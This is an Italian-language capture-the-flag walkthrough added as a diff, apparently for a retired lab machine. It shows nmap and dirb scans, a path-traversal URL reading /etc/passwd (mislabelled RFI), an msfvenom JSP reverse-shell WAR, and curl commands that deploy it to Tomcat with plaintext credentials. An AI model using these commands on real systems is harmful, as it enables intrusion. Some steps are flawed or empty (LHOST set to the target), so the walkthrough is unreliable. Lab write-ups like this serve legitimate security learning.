@@ -1,0 +1,74 @@
+nmap -A 10.10.10.194
+
+	22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+	80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+	|_http-server-header: Apache/2.4.41 (Ubuntu)
+	|_http-title: Mega Hosting
+	8080/tcp open  http    Apache Tomcat
+	|_http-title: Apache Tomcat
+	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+----------------------------------------------------------------------------------------------------
+
+Visualizziamo la pagina del server 10.10.10.194, c'è un servizio che si chiama Mega Hosting, 
+come potevamo evincere anche dalla scansione di nmap
+
+Analizziamo il contenuto del server con dirb
+
+dirb http://10.10.10.194 -w /usr/share/wordlists/dirb/common.txt
+
+	---- Scanning URL: http://10.10.10.194/ ----
+	==> DIRECTORY: http://10.10.10.194/assets/                                                                                                    
+	+ http://10.10.10.194/favicon.ico (CODE:200|SIZE:766)                                                                                         
+	==> DIRECTORY: http://10.10.10.194/files/                                                                                                     
+	+ http://10.10.10.194/index.php (CODE:200|SIZE:14175)                                                                                         
+	+ http://10.10.10.194/server-status (CODE:403|SIZE:277)                                                                                       
+		                                                                                                                                      
+	---- Entering directory: http://10.10.10.194/assets/ ----
+	==> DIRECTORY: http://10.10.10.194/assets/css/                                                                                                
+	==> DIRECTORY: http://10.10.10.194/assets/fonts/                                                                                              
+	==> DIRECTORY: http://10.10.10.194/assets/images/                                                                                             
+	==> DIRECTORY: http://10.10.10.194/assets/js/                                                                                                 
+		                                                                                                                                      
+	---- Entering directory: http://10.10.10.194/files/ ----
+	==> DIRECTORY: http://10.10.10.194/files/archive/                                                                                             
+	+ http://10.10.10.194/files/statement (CODE:200|SIZE:6507)                                                                                    
+		                                                                                                                                      
+	---- Entering directory: http://10.10.10.194/assets/css/ ----
+		                                                                                                                                      
+	---- Entering directory: http://10.10.10.194/assets/fonts/ ----
+		                                                                                                                                      
+	---- Entering directory: http://10.10.10.194/assets/images/ ----
+		                                                                                                                                      
+	---- Entering directory: http://10.10.10.194/assets/js/ ----
+	==> DIRECTORY: http://10.10.10.194/assets/js/vendor/                                                                                          
+		                                                                                                                                      
+	---- Entering directory: http://10.10.10.194/files/archive/ ----
+		                                                                                                                                      
+	---- Entering directory: http://10.10.10.194/assets/js/vendor/ ----
+
+
+----------------------------------------------------------------------------------------------------
+Tramite un link all'interno della pagina (http://megahosting.htb/news.php?file=statement) notiamo che c'è un rifermo al sito www.megahostin.htb 
+e quindi andiamo ad aggiungere al file hosts la seguente riga
+10.10.10.194	www.megahosting.htb
+
+Dallo stesso link notiamo che possiamo sfruttare un RFI
+http://megahosting.htb/news.php?file=../../../.../../../../../etc/passwd
+----------------------------------------------------------------------------------------------------
+Facendo un po' di bruteforce sul sito 
+
+----------------------------------------------------------------------------------------------------
+
+Dopo aver trovat le credenziali dell'utente 'tomcat', creiamo un war con una backdoor
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.194 LPORT=4444 -f war > shell.war
+
+----------------------------------------------------------------------------------------------------
+Deployamo tramite curl il nuovo war
+curl -u 'tomcat':'$3cureP4s5w0rd123!' -T shell.war 'http://10.10.10.194:8080/manager/text/deploy?path=/rev_shell'
+----------------------------------------------------------------------------------------------------
+Chiamiamo l'app
+curl -u 'tomcat':'$3cureP4s5w0rd123!' http://10.10.10.194:8080/rev_shell/
+----------------------------------------------------------------------------------------------------
+CTF interrotta perché hanno ritirato la macchina
